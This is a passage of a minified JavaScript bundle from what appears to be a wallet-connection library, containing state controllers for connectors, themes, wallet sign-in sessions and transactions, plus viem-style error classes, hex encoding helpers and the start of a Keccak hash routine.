r,n,i;if(t){me.setFarcasterUrl(void 0,B.state.activeChain);const s=ae.getAuthConnector();(r=s==null?void 0:s.provider)==null||r.reload();const o=Fd(Y.state);(i=(n=s==null?void 0:s.provider)==null?void 0:n.syncDappData)==null||i.call(n,{metadata:o.metadata,sdkVersion:o.sdkVersion,projectId:o.projectId,sdkType:o.sdkType})}},100)},goBackToIndex(t){if(Ye.history.length>1){Ye.history=Ye.history.slice(0,t+1);const[e]=Ye.history.slice(-1);e&&(Ye.view=e)}}},rs=ht({themeMode:"dark",themeVariables:{},w3mThemeVariables:void 0}),Bt={state:rs,subscribe(t){return yr(rs,()=>t(rs))},setThemeMode(t){rs.themeMode=t;try{const e=ae.getAuthConnector();if(e){const r=Bt.getSnapshot().themeVariables;e.provider.syncTheme({themeMode:t,themeVariables:r,w3mThemeVariables:Ro(r,t)})}}catch{console.info("Unable to sync theme to auth connector")}},setThemeVariables(t){rs.themeVariables={...rs.themeVariables,...t};try{const e=ae.getAuthConnector();if(e){const r=Bt.getSnapshot().themeVariables;e.provider.syncTheme({themeVariables:r,w3mThemeVariables:Ro(rs.themeVariables,rs.themeMode)})}}catch{console.info("Unable to sync theme to auth connector")}},getSnapshot(){return Fd(rs)}},vA={eip155:void 0,solana:void 0,polkadot:void 0,bip122:void 0},rt=ht({allConnectors:[],connectors:[],activeConnector:void 0,filterByNamespace:void 0,activeConnectorIds:{...vA}}),ae={state:rt,subscribe(t){return yr(rt,()=>{t(rt)})},subscribeKey(t,e){return Tr(rt,t,e)},initialize(t){t.forEach(e=>{const r=pe.getConnectedConnectorId(e);r&&this.setConnectorId(r,e)})},setActiveConnector(t){t&&(rt.activeConnector=Cc(t))},setConnectors(t){t.filter(e=>!rt.allConnectors.some(r=>r.id===e.id&&this.getConnectorName(r.name)===this.getConnectorName(e.name)&&r.chain===e.chain)).forEach(e=>{e.type!=="MULTI_CHAIN"&&rt.allConnectors.push(Cc(e))}),rt.connectors=this.mergeMultiChainConnectors(rt.allConnectors)},removeAdapter(t){rt.allConnectors=rt.allConnectors.filter(e=>e.chain!==t),rt.connectors=this.mergeMultiChainConnectors(rt.allConnectors)},mergeMultiChainConnectors(t){const e=this.generateConnectorMapByName(t),r=[];return e.forEach(n=>{const i=n[0],s=(i==null?void 0:i.id)===ve.CONNECTOR_ID.AUTH;n.length>1&&i?r.push({name:i.name,imageUrl:i.imageUrl,imageId:i.imageId,connectors:[...n],type:s?"AUTH":"MULTI_CHAIN",chain:"eip155",id:(i==null?void 0:i.id)||""}):i&&r.push(i)}),r},generateConnectorMapByName(t){const e=new Map;return t.forEach(r=>{const{name:n}=r,i=this.getConnectorName(n);if(!i)return;const s=e.get(i)||[];s.find(o=>o.chain===r.chain)||s.push(r),e.set(i,s)}),e},getConnectorName(t){return t&&({"Trust Wallet":"Trust"}[t]||t)},getUniqueConnectorsByName(t){const e=[];return t.forEach(r=>{e.find(n=>n.chain===r.chain)||e.push(r)}),e},addConnector(t){var e,r,n;if(t.id===ve.CONNECTOR_ID.AUTH){const i=t,s=Fd(Y.state),o=Bt.getSnapshot().themeMode,a=Bt.getSnapshot().themeVariables;(r=(e=i==null?void 0:i.provider)==null?void 0:e.syncDappData)==null||r.call(e,{metadata:s.metadata,sdkVersion:s.sdkVersion,projectId:s.projectId,sdkType:s.sdkType}),(n=i==null?void 0:i.provider)==null||n.syncTheme({themeMode:o,themeVariables:a,w3mThemeVariables:Ro(a,o)}),this.setConnectors([t])}else this.setConnectors([t])},getAuthConnector(t){var n;const e=t||B.state.activeChain,r=rt.connectors.find(i=>i.id===ve.CONNECTOR_ID.AUTH);if(r)return(n=r==null?void 0:r.connectors)!=null&&n.length?r.connectors.find(i=>i.chain===e):r},getAnnouncedConnectorRdns(){return rt.connectors.filter(t=>t.type==="ANNOUNCED").map(t=>{var e;return(e=t.info)==null?void 0:e.rdns})},getConnectorById(t){return rt.allConnectors.find(e=>e.id===t)},getConnector(t,e){return rt.allConnectors.filter(r=>r.chain===B.state.activeChain).find(r=>{var n;return r.explorerId===t||((n=r.info)==null?void 0:n.rdns)===e})},syncIfAuthConnector(t){var s,o;if(t.id!=="ID_AUTH")return;const e=t,r=Fd(Y.state),n=Bt.getSnapshot().themeMode,i=Bt.getSnapshot().themeVariables;(o=(s=e==null?void 0:e.provider)==null?void 0:s.syncDappData)==null||o.call(s,{metadata:r.metadata,sdkVersion:r.sdkVersion,sdkType:r.sdkType,projectId:r.projectId}),e.provider.syncTheme({themeMode:n,themeVariables:i,w3mThemeVariables:Ro(i,n)})},getConnectorsByNamespace(t){const e=rt.allConnectors.filter(r=>r.chain===t);return this.mergeMultiChainConnectors(e)},selectWalletConnector(t){const e=ae.getConnector(t.id,t.rdns);B.state.activeChain===ve.CHAIN.SOLANA&&vj.handleSolanaDeeplinkRedirect((e==null?void 0:e.name)||t.name||""),e?se.push("ConnectingExternal",{connector:e}):se.push("ConnectingWalletConnect",{wallet:t})},getConnectors(t){return t?this.getConnectorsByNamespace(t):this.mergeMultiChainConnectors(rt.allConnectors)},setFilterByNamespace(t){rt.filterByNamespace=t,rt.connectors=this.getConnectors(t),oe.setFilterByNamespace(t)},setConnectorId(t,e){t&&(rt.activeConnectorIds={...rt.activeConnectorIds,[e]:t},pe.setConnectedConnectorId(e,t))},removeConnectorId(t){rt.activeConnectorIds={...rt.activeConnectorIds,[t]:void 0},pe.deleteConnectedConnectorId(t)},getConnectorId(t){if(t)return rt.activeConnectorIds[t]},isConnected(t){return t?!!rt.activeConnectorIds[t]:Object.values(rt.activeConnectorIds).some(e=>!!e)},resetConnectorIds(){rt.activeConnectorIds={...vA}}};function _p(t,e){return ae.getConnectorId(t)===e}function Oj(t){const e=Array.from(B.state.chains.keys());let r=[];return t?(r.push([t,B.state.chains.get(t)]),_p(t,ve.CONNECTOR_ID.WALLET_CONNECT)?e.forEach(n=>{n!==t&&_p(n,ve.CONNECTOR_ID.WALLET_CONNECT)&&r.push([n,B.state.chains.get(n)])}):_p(t,ve.CONNECTOR_ID.AUTH)&&e.forEach(n=>{n!==t&&_p(n,ve.CONNECTOR_ID.AUTH)&&r.push([n,B.state.chains.get(n)])})):r=Array.from(B.state.chains.entries()),r}const uo={SAFE_RPC_METHODS:["eth_accounts","eth_blockNumber","eth_call","eth_chainId","eth_estimateGas","eth_feeHistory","eth_gasPrice","eth_getAccount","eth_getBalance","eth_getBlockByHash","eth_getBlockByNumber","eth_getBlockReceipts","eth_getBlockTransactionCountByHash","eth_getBlockTransactionCountByNumber","eth_getCode","eth_getFilterChanges","eth_getFilterLogs","eth_getLogs","eth_getProof","eth_getStorageAt","eth_getTransactionByBlockHashAndIndex","eth_getTransactionByBlockNumberAndIndex","eth_getTransactionByHash","eth_getTransactionCount","eth_getTransactionReceipt","eth_getUncleCountByBlockHash","eth_getUncleCountByBlockNumber","eth_maxPriorityFeePerGas","eth_newBlockFilter","eth_newFilter","eth_newPendingTransactionFilter","eth_sendRawTransaction","eth_syncing","eth_uninstallFilter","wallet_getCapabilities","wallet_getCallsStatus","eth_getUserOperationReceipt","eth_estimateUserOperationGas","eth_getUserOperationByHash","eth_supportedEntryPoints","wallet_getAssets"],NOT_SAFE_RPC_METHODS:["personal_sign","eth_signTypedData_v4","eth_sendTransaction","solana_signMessage","solana_signTransaction","solana_signAllTransactions","solana_signAndSendTransaction","wallet_sendCalls","wallet_grantPermissions","wallet_revokePermissions","eth_sendUserOperation"],GET_CHAIN_ID:"eth_chainId",RPC_METHOD_NOT_ALLOWED_MESSAGE:"Requested RPC call is not allowed",RPC_METHOD_NOT_ALLOWED_UI_MESSAGE:"Action not allowed",ACCOUNT_TYPES:{EOA:"eoa",SMART_ACCOUNT:"smartAccount"}},ba=Object.freeze({message:"",variant:"success",svg:void 0,open:!1,autoClose:!0}),Rt=ht({...ba}),ut={state:Rt,subscribeKey(t,e){return Tr(Rt,t,e)},showLoading(t,e={}){this._showMessage({message:t,variant:"loading",...e})},showSuccess(t){this._showMessage({message:t,variant:"success"})},showSvg(t,e){this._showMessage({message:t,svg:e})},showError(t){const e=te.parseError(t);this._showMessage({message:e,variant:"error"})},hide(){Rt.message=ba.message,Rt.variant=ba.variant,Rt.svg=ba.svg,Rt.open=ba.open,Rt.autoClose=ba.autoClose},_showMessage({message:t,svg:e,variant:r="success",autoClose:n=ba.autoClose}){Rt.open?(Rt.open=!1,setTimeout(()=>{Rt.message=t,Rt.variant=r,Rt.svg=e,Rt.open=!0,Rt.autoClose=n},150)):(Rt.message=t,Rt.variant=r,Rt.svg=e,Rt.open=!0,Rt.autoClose=n)}},Uo={getSIWX(){return Y.state.siwx},async initializeIfEnabled(){var s;const t=Y.state.siwx,e=B.getActiveCaipAddress();if(!(t&&e))return;const[r,n,i]=e.split(":");if(B.checkIfSupportedNetwork(r))try{if((await t.getSessions(`${r}:${n}`,i)).length)return;await qe.open({view:"SIWXSignMessage"})}catch(o){console.error("SIWXUtil:initializeIfEnabled",o),De.sendEvent({type:"track",event:"SIWX_AUTH_ERROR",properties:this.getSIWXEventProperties()}),await((s=we._getClient())==null?void 0:s.disconnect().catch(console.error)),se.reset("Connect"),ut.showError("A problem occurred while trying initialize authentication")}},async requestSignMessage(){const t=Y.state.siwx,e=te.getPlainAddress(B.getActiveCaipAddress()),r=B.getActiveCaipNetwork(),n=we._getClient();if(!t)throw new Error("SIWX is not enabled");if(!e)throw new Error("No ActiveCaipAddress found");if(!r)throw new Error("No ActiveCaipNetwork or client found");if(!n)throw new Error("No ConnectionController client found");try{const i=await t.createMessage({chainId:r.caipNetworkId,accountAddress:e}),s=i.toString();ae.getConnectorId(r.chainNamespace)===ve.CONNECTOR_ID.AUTH&&se.pushTransactionStack({view:null,goBack:!1,replace:!0});const o=await n.signMessage(s);await t.addSession({data:i,message:s,signature:o}),qe.close(),De.sendEvent({type:"track",event:"SIWX_AUTH_SUCCESS",properties:this.getSIWXEventProperties()})}catch(i){const s=this.getSIWXEventProperties();(!qe.state.open||se.state.view==="ApproveTransaction")&&await qe.open({view:"SIWXSignMessage"}),s.isSmartAccount?ut.showError("This application might not support Smart Accounts"):ut.showError("Signature declined"),De.sendEvent({type:"track",event:"SIWX_AUTH_ERROR",properties:s}),console.error("SWIXUtil:requestSignMessage",i)}},async cancelSignMessage(){var t,e;try{(e=(t=this.getSIWX())==null?void 0:t.getRequired)!=null&&e.call(t)?await we.disconnect():qe.close(),se.reset("Connect"),De.sendEvent({event:"CLICK_CANCEL_SIWX",type:"track",properties:this.getSIWXEventProperties()})}catch(r){console.error("SIWXUtil:cancelSignMessage",r)}},async getSessions(){const t=Y.state.siwx,e=te.getPlainAddress(B.getActiveCaipAddress()),r=B.getActiveCaipNetwork();return t&&e&&r?t.getSessions(r.caipNetworkId,e):[]},async isSIWXCloseDisabled(){var e;const t=this.getSIWX();if(t){const r=se.state.view==="ApproveTransaction",n=se.state.view==="SIWXSignMessage";if(r||n)return((e=t.getRequired)==null?void 0:e.call(t))&&(await this.getSessions()).length===0}return!1},async universalProviderAuthenticate({universalProvider:t,chains:e,methods:r}){var a,c,l;const n=Uo.getSIWX(),i=new Set(e.map(u=>u.split(":")[0]));if(!n||i.size!==1||!i.has("eip155"))return!1;const s=await n.createMessage({chainId:((a=B.getActiveCaipNetwork())==null?void 0:a.caipNetworkId)||"",accountAddress:""}),o=await t.authenticate({nonce:s.nonce,domain:s.domain,uri:s.uri,exp:s.expirationTime,iat:s.issuedAt,nbf:s.notBefore,requestId:s.requestId,version:s.version,resources:s.resources,statement:s.statement,chainId:s.chainId,methods:r,chains:[s.chainId,...e.filter(u=>u!==s.chainId)]});if(ut.showLoading("Authenticating...",{autoClose:!1}),me.setConnectedWalletInfo({...o.session.peer.metadata,name:o.session.peer.metadata.name,icon:(c=o.session.peer.metadata.icons)==null?void 0:c[0],type:"WALLET_CONNECT"},Array.from(i)[0]),(l=o==null?void 0:o.auths)==null?void 0:l.length){const u=o.auths.map(h=>{const d=t.client.formatAuthMessage({request:h.p,iss:h.p.iss});return{data:{...h.p,accountAddress:h.p.iss.split(":").slice(-1).join(""),chainId:h.p.iss.split(":").slice(2,4).join(":"),uri:h.p.aud,version:h.p.version||s.version,expirationTime:h.p.exp,issuedAt:h.p.iat,notBefore:h.p.nbf},message:d,signature:h.s.s,cacao:h}});try{await n.setSessions(u),De.sendEvent({type:"track",event:"SIWX_AUTH_SUCCESS",properties:Uo.getSIWXEventProperties()})}catch(h){throw console.error("SIWX:universalProviderAuth - failed to set sessions",h),De.sendEvent({type:"track",event:"SIWX_AUTH_ERROR",properties:Uo.getSIWXEventProperties()}),await t.disconnect().catch(console.error),h}finally{ut.hide()}}return!0},getSIWXEventProperties(){var e,r;const t=B.state.activeChain;return{network:((e=B.state.activeCaipNetwork)==null?void 0:e.caipNetworkId)||"",isSmartAccount:((r=me.state.preferredAccountTypes)==null?void 0:r[t])===uo.ACCOUNT_TYPES.SMART_ACCOUNT}},async clearSessions(){const t=this.getSIWX();t&&await t.setSessions([])}},ft=ht({transactions:[],coinbaseTransactions:{},transactionsByYear:{},lastNetworkInView:void 0,loading:!1,empty:!1,next:void 0}),_j={state:ft,subscribe(t){return yr(ft,()=>t(ft))},setLastNetworkInView(t){ft.lastNetworkInView=t},async fetchTransactions(t,e){var r,n;if(!t)throw new Error("Transactions can't be fetched without an accountAddress");ft.loading=!0;try{const i=await Ie.fetchTransactions({account:t,cursor:ft.next,onramp:e,cache:e==="coinbase"?"no-cache":void 0,chainId:(r=B.state.activeCaipNetwork)==null?void 0:r.caipNetworkId}),s=this.filterSpamTransactions(i.data),o=this.filterByConnectedChain(s),a=[...ft.transactions,...o];ft.loading=!1,e==="coinbase"?ft.coinbaseTransactions=this.groupTransactionsByYearAndMonth(ft.coinbaseTransactions,i.data):(ft.transactions=a,ft.transactionsByYear=this.groupTransactionsByYearAndMonth(ft.transactionsByYear,o)),ft.empty=a.length===0,ft.next=i.next?i.next:void 0}catch{const i=B.state.activeChain;De.sendEvent({type:"track",event:"ERROR_FETCH_TRANSACTIONS",properties:{address:t,projectId:Y.state.projectId,cursor:ft.next,isSmartAccount:((n=me.state.preferredAccountTypes)==null?void 0:n[i])===uo.ACCOUNT_TYPES.SMART_ACCOUNT}}),ut.showError("Failed to fetch transactions"),ft.loading=!1,ft.empty=!0,ft.next=void 0}},groupTransactionsByYearAndMonth(t={},e=[]){const r=t;return e.forEach(n=>{const i=new Date(n.metadata.minedAt).getFullYear(),s=new Date(n.metadata.minedAt).getMonth(),o=r[i]??{},a=(o[s]??[]).filter(c=>c.id!==n.id);r[i]={...o,[s]:[...a,n].sort((c,l)=>new Date(l.metadata.minedAt).getTime()-new Date(c.metadata.minedAt).getTime())}}),r},filterSpamTransactions(t){return t.filter(e=>!e.transfers.every(r=>{var n;return((n=r.nft_info)==null?void 0:n.flags.is_spam)===!0}))},filterByConnectedChain(t){var r;const e=(r=B.state.activeCaipNetwork)==null?void 0:r.caipNetworkId;return t.filter(n=>n.metadata.chain===e)},clearCursor(){ft.next=void 0},resetTransactions(){ft.transactions=[],ft.transactionsByYear={},ft.lastNetworkInView=void 0,ft.loading=!1,ft.empty=!1,ft.next=void 0}},pt=ht({wcError:!1,buffering:!1,status:"disconnected"});let ol;const we={state:pt,subscribeKey(t,e){return Tr(pt,t,e)},_getClient(){return pt._client},setClient(t){pt._client=Cc(t)},async connectWalletConnect(){var t,e,r,n;if(te.isTelegram()||te.isSafari()&&te.isIos()){if(ol){await ol,ol=void 0;return}if(!te.isPairingExpired(pt==null?void 0:pt.wcPairingExpiry)){const i=pt.wcUri;pt.wcUri=i;return}ol=(e=(t=this._getClient())==null?void 0:t.connectWalletConnect)==null?void 0:e.call(t).catch(()=>{}),this.state.status="connecting",await ol,ol=void 0,pt.wcPairingExpiry=void 0,this.state.status="connected"}else await((n=(r=this._getClient())==null?void 0:r.connectWalletConnect)==null?void 0:n.call(r))},async connectExternal(t,e,r=!0){var n,i;await((i=(n=this._getClient())==null?void 0:n.connectExternal)==null?void 0:i.call(n,t)),r&&B.setActiveNamespace(e)},async reconnectExternal(t){var r,n;await((n=(r=this._getClient())==null?void 0:r.reconnectExternal)==null?void 0:n.call(r,t));const e=t.chain||B.state.activeChain;e&&ae.setConnectorId(t.id,e)},async setPreferredAccountType(t,e){var n;qe.setLoading(!0,B.state.activeChain);const r=ae.getAuthConnector();r&&(me.setPreferredAccountType(t,e),await r.provider.setPreferredAccount(t),pe.setPreferredAccountTypes(me.state.preferredAccountTypes??{[e]:t}),await this.reconnectExternal(r),qe.setLoading(!1,B.state.activeChain),De.sendEvent({type:"track",event:"SET_PREFERRED_ACCOUNT_TYPE",properties:{accountType:t,network:((n=B.state.activeCaipNetwork)==null?void 0:n.caipNetworkId)||""}}))},async signMessage(t){var e;return(e=this._getClient())==null?void 0:e.signMessage(t)},parseUnits(t,e){var r;return(r=this._getClient())==null?void 0:r.parseUnits(t,e)},formatUnits(t,e){var r;return(r=this._getClient())==null?void 0:r.formatUnits(t,e)},async sendTransaction(t){var e;return(e=this._getClient())==null?void 0:e.sendTransaction(t)},async getCapabilities(t){var e;return(e=this._getClient())==null?void 0:e.getCapabilities(t)},async grantPermissions(t){var e;return(e=this._getClient())==null?void 0:e.grantPermissions(t)},async walletGetAssets(t){var e;return((e=this._getClient())==null?void 0:e.walletGetAssets(t))??{}},async estimateGas(t){var e;return(e=this._getClient())==null?void 0:e.estimateGas(t)},async writeContract(t){var e;return(e=this._getClient())==null?void 0:e.writeContract(t)},async getEnsAddress(t){var e;return(e=this._getClient())==null?void 0:e.getEnsAddress(t)},async getEnsAvatar(t){var e;return(e=this._getClient())==null?void 0:e.getEnsAvatar(t)},checkInstalled(t){var e,r;return((r=(e=this._getClient())==null?void 0:e.checkInstalled)==null?void 0:r.call(e,t))||!1},resetWcConnection(){pt.wcUri=void 0,pt.wcPairingExpiry=void 0,pt.wcLinking=void 0,pt.recentWallet=void 0,pt.status="disconnected",_j.resetTransactions(),pe.deleteWalletConnectDeepLink()},resetUri(){pt.wcUri=void 0,pt.wcPairingExpiry=void 0},finalizeWcConnection(){var r,n;const{wcLinking:t,recentWallet:e}=we.state;t&&pe.setWalletConnectDeepLink(t),e&&pe.setAppKitRecent(e),De.sendEvent({type:"track",event:"CONNECT_SUCCESS",properties:{method:t?"mobile":"qrcode",name:((n=(r=se.state.data)==null?void 0:r.wallet)==null?void 0:n.name)||"Unknown"}})},setWcBasic(t){pt.wcBasic=t},setUri(t){pt.wcUri=t,pt.wcPairingExpiry=te.getPairingExpiry()},setWcLinking(t){pt.wcLinking=t},setWcError(t){pt.wcError=t,pt.buffering=!1},setRecentWallet(t){pt.recentWallet=t},setBuffering(t){pt.buffering=t},setStatus(t){pt.status=t},async disconnect(t){try{qe.setLoading(!0,t),await Uo.clearSessions(),await B.disconnect(t),qe.setLoading(!1,t),ae.setFilterByNamespace(void 0)}catch{throw new Error("Failed to disconnect")}}},al=ht({loading:!1,open:!1,selectedNetworkId:void 0,activeChain:void 0,initialized:!1}),Us={state:al,subscribe(t){return yr(al,()=>t(al))},subscribeOpen(t){return Tr(al,"open",t)},set(t){Object.assign(al,{...al,...t})}};function Qf(t,{strict:e=!0}={}){return!t||typeof t!="string"?!1:e?/^0x[0-9a-fA-F]*$/.test(t):t.startsWith("0x")}function ju(t){return Qf(t,{strict:!1})?Math.ceil((t.length-2)/2):t.length}const EA="2.27.0";let $h={getDocsUrl:({docsBaseUrl:t,docsPath:e="",docsSlug:r})=>e?`${t??"https://viem.sh"}${e}${r?`#${r}`:""}`:void 0,version:`viem@${EA}`};class Je extends Error{constructor(e,r={}){var a,c;const n=r.cause instanceof Je?r.cause.details:(a=r.cause)!=null&&a.message?r.cause.message:r.details,i=r.cause instanceof Je&&r.cause.docsPath||r.docsPath,s=(c=$h.getDocsUrl)==null?void 0:c.call($h,{...r,docsPath:i}),o=[e||"An error occurred.","",...r.metaMessages?[...r.metaMessages,""]:[],...s?[`Docs: ${s}`]:[],...n?[`Details: ${n}`]:[],...$h.version?[`Version: ${$h.version}`]:[]].join(`
`);super(o,r.cause?{cause:r.cause}:void 0),Object.defineProperty(this,"details",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"docsPath",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"metaMessages",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"shortMessage",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"version",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"BaseError"}),this.details=n,this.docsPath=i,this.metaMessages=r.metaMessages,this.name=r.name??this.name,this.shortMessage=e,this.version=EA}walk(e){return CA(this,e)}}function CA(t,e){return e!=null&&e(t)?t:t&&typeof t=="object"&&"cause"in t&&t.cause!==void 0?CA(t.cause,e):e?null:t}class Tj extends Je{constructor({offset:e,position:r,size:n}){super(`Slice ${r==="start"?"starting":"ending"} at offset "${e}" is out-of-bounds (size: ${n}).`,{name:"SliceOffsetOutOfBoundsError"})}}class AA extends Je{constructor({size:e,targetSize:r,type:n}){super(`${n.charAt(0).toUpperCase()}${n.slice(1).toLowerCase()} size (${e}) exceeds padding size (${r}).`,{name:"SizeExceedsPaddingSizeError"})}}function fh(t,{dir:e,size:r=32}={}){return typeof t=="string"?$j(t,{dir:e,size:r}):Rj(t,{dir:e,size:r})}function $j(t,{dir:e,size:r=32}={}){if(r===null)return t;const n=t.replace("0x","");if(n.length>r*2)throw new AA({size:Math.ceil(n.length/2),targetSize:r,type:"hex"});return`0x${n[e==="right"?"padEnd":"padStart"](r*2,"0")}`}function Rj(t,{dir:e,size:r=32}={}){if(r===null)return t;if(t.length>r)throw new AA({size:t.length,targetSize:r,type:"bytes"});const n=new Uint8Array(r);for(let i=0;i<r;i++){const s=e==="right";n[s?i:r-i-1]=t[s?i:t.length-i-1]}return n}class Dj extends Je{constructor({max:e,min:r,signed:n,size:i,value:s}){super(`Number "${s}" is not in safe ${i?`${i*8}-bit ${n?"signed":"unsigned"} `:""}integer range ${e?`(${r} to ${e})`:`(above ${r})`}`,{name:"IntegerOutOfRangeError"})}}class Bj extends Je{constructor({givenSize:e,maxSize:r}){super(`Size cannot exceed ${r} bytes. Given size: ${e} bytes.`,{name:"SizeOverflowError"})}}function sg(t,{dir:e="left"}={}){let r=typeof t=="string"?t.replace("0x",""):t,n=0;for(let i=0;i<r.length-1&&r[e==="left"?i:r.length-i-1].toString()==="0";i++)n++;return r=e==="left"?r.slice(n):r.slice(0,r.length-n),typeof t=="string"?(r.length===1&&e==="right"&&(r=`${r}0`),`0x${r.length%2===1?`0${r}`:r}`):r}function ph(t,{size:e}){if(ju(t)>e)throw new Bj({givenSize:ju(t),maxSize:e})}function Cl(t,e={}){const{signed:r}=e;e.size&&ph(t,{size:e.size});const n=BigInt(t);if(!r)return n;const i=(t.length-2)/2,s=(1n<<BigInt(i)*8n-1n)-1n;return n<=s?n:n-BigInt(`0x${"f".padStart(i*2,"f")}`)-1n}function og(t,e={}){return Number(Cl(t,e))}const Lj=Array.from({length:256},(t,e)=>e.toString(16).padStart(2,"0"));function Oe(t,e={}){return typeof t=="number"||typeof t=="bigint"?xA(t,e):typeof t=="string"?IA(t,e):typeof t=="boolean"?Uj(t,e):Ko(t,e)}function Uj(t,e={}){const r=`0x${Number(t)}`;return typeof e.size=="number"?(ph(r,{size:e.size}),fh(r,{size:e.size})):r}function Ko(t,e={}){let r="";for(let i=0;i<t.length;i++)r+=Lj[t[i]];const n=`0x${r}`;return typeof e.size=="number"?(ph(n,{size:e.size}),fh(n,{dir:"right",size:e.size})):n}function xA(t,e={}){const{signed:r,size:n}=e,i=BigInt(t);let s;n?r?s=(1n<<BigInt(n)*8n-1n)-1n:s=2n**(BigInt(n)*8n)-1n:typeof t=="number"&&(s=BigInt(Number.MAX_SAFE_INTEGER));const o=typeof s=="bigint"&&r?-s-1n:0;if(s&&i>s||i<o){const c=typeof t=="bigint"?"n":"";throw new Dj({max:s?`${s}${c}`:void 0,min:`${o}${c}`,signed:r,size:n,value:`${t}${c}`})}const a=`0x${(r&&i<0?(1n<<BigInt(n*8))+BigInt(i):i).toString(16)}`;return n?fh(a,{size:n}):a}const Mj=new TextEncoder;function IA(t,e={}){const r=Mj.encode(t);return Ko(r,e)}const Fj=new TextEncoder;function SA(t,e={}){return typeof t=="number"||typeof t=="bigint"?jj(t,e):typeof t=="boolean"?zj(t,e):Qf(t)?Ac(t,e):NA(t,e)}function zj(t,e={}){const r=new Uint8Array(1);return r[0]=Number(t),typeof e.size=="number"?(ph(r,{size:e.size}),fh(r,{size:e.size})):r}const ns={zero:48,nine:57,A:65,F:70,a:97,f:102};function c4(t){if(t>=ns.zero&&t<=ns.nine)return t-ns.zero;if(t>=ns.A&&t<=ns.F)return t-(ns.A-10);if(t>=ns.a&&t<=ns.f)return t-(ns.a-10)}function Ac(t,e={}){let r=t;e.size&&(ph(r,{size:e.size}),r=fh(r,{dir:"right",size:e.size}));let n=r.slice(2);n.length%2&&(n=`0${n}`);const i=n.length/2,s=new Uint8Array(i);for(let o=0,a=0;o<i;o++){const c=c4(n.charCodeAt(a++)),l=c4(n.charCodeAt(a++));if(c===void 0||l===void 0)throw new Je(`Invalid byte sequence ("${n[a-2]}${n[a-1]}" in "${n}").`);s[o]=c*16+l}return s}function jj(t,e){const r=xA(t,e);return Ac(r)}function NA(t,e={}){const r=Fj.encode(t);return typeof e.size=="number"?(ph(r,{size:e.size}),fh(r,{dir:"right",size:e.size})):r}function ag(t){if(!Number.isSafeInteger(t)||t<0)throw new Error("positive integer expected, got "+t)}function Hj(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function Yf(t,...e){if(!Hj(t))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(t.length))throw new Error("Uint8Array expected of length "+e+", got length="+t.length)}function qj(t){if(typeof t!="function"||typeof t.create!="function")throw new Error("Hash should be wrapped by utils.wrapConstructor");ag(t.outputLen),ag(t.blockLen)}function Hu(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}function PA(t,e){Yf(t);const r=e.outputLen;if(t.length<r)throw new Error("digestInto() expects output buffer of length at least "+r)}const Tp=BigInt(2**32-1),l4=BigInt(32);function Vj(t,e=!1){return e?{h:Number(t&Tp),l:Number(t>>l4&Tp)}:{h:Number(t>>l4&Tp)|0,l:Number(t&Tp)|0}}function Wj(t,e=!1){let r=new Uint32Array(t.length),n=new Uint32Array(t.length);for(let i=0;i<t.length;i++){const{h:s,l:o}=Vj(t[i],e);[r[i],n[i]]=[s,o]}return[r,n]}const Gj=(t,e,r)=>t<<r|e>>>32-r,Kj=(t,e,r)=>e<<r|t>>>32-r,Zj=(t,e,r)=>e<<r-32|t>>>64-r,Jj=(t,e,r)=>t<<r-32|e>>>64-r,cl=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0;function Qj(t){return new Uint32Array(t.buffer,t.byteOffset,Math.floor(t.byteLength/4))}function Sw(t){return new DataView(t.buffer,t.byteOffset,t.byteLength)}function Ei(t,e){return t<<32-e|t>>>e}const u4=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;function Yj(t){return t<<24&4278190080|t<<8&16711680|t>>>8&65280|t>>>24&255}function h4(t){for(let e=0;e<t.length;e++)t[e]=Yj(t[e])}function Xj(t){if(typeof t!="string")throw new Error("utf8ToBytes expected string, got "+typeof t);return new Uint8Array(new TextEncoder().encode(t))}function i1(t){return typeof t=="string"&&(t=Xj(t)),Yf(t),t}function eH(...t){let e=0;for(let n=0;n<t.length;n++){const i=t[n];Yf(i),e+=i.length}const r=new Uint8Array(e);for(let n=0,i=0;n<t.length;n++){const s=t[n];r.set(s,i),i+=s.length}return r}class r2{clone(){return this._cloneInto()}}function kA(t){const e=n=>t().update(i1(n)).digest(),r=t();return e.outputLen=r.outputLen,e.blockLen=r.blockLen,e.create=()=>t(),e}function tH(t=32){if(cl&&typeof cl.getRandomValues=="function")return cl.getRandomValues(new Uint8Array(t));if(cl&&typeof cl.randomBytes=="function")return cl.randomBytes(t);throw new Error("crypto.getRandomValues must be defined")}const OA=[],_A=[],TA=[],rH=BigInt(0),Rh=BigInt(1),nH=BigInt(2),iH=BigInt(7),sH=BigInt(256),oH=BigInt(113);for(let t=0,e=Rh,r=1,n=0;t<24;t++){[r,n]=[n,(2*r+3*n)%5],OA.push(2*(5*n+r)),_A.push((t+1)*(t+2)/2%64);let i=rH;for(let s=0;s<7;s++)e=(e<<Rh^(e>>iH)*oH)%sH,e&nH&&(i^=Rh<<(Rh<<BigInt(s))-Rh);TA.push(i)}const[aH,cH]=Wj(TA,!0),d4=(t,e,r)=>r>32?Zj(t,e,r):Gj(t,e,r),f4=(t,e,r)=>r>32?Jj(t,e,r):Kj(t,e,r);function lH(t,e=24){const r=new Uint32Array(10);for(let n=24-e;n<24;n++){for(let o=0;o<10;o++)r[o]=t[o]^t[o+10]^t[o+20]^t[o+30]^t[o+40];for(let o=0;o<10;o+=2){const a=(o+8)%10,c=(o+2)%10,l=r[c],u=r[c+1],h=d4(l,u,1)^r[a],d=f4(l,u,1)^r[a+1];for(let f=0;f<50;f+=10)t[o+f]^=h,t[o+f+1]^=d}let i=t[2],s=t[3];for(let o=0;o<24;o++){const a=_A[o],c=d4(i,s,a),l=f4(i,s,a),u=OA[o];i=t[u],s=t[u+1],t[u]=c,t[u+1]=l}for(let o=0;o<50;o+=10){for(let a=0;a<10;a++)r[a]=t[o+a];for(let 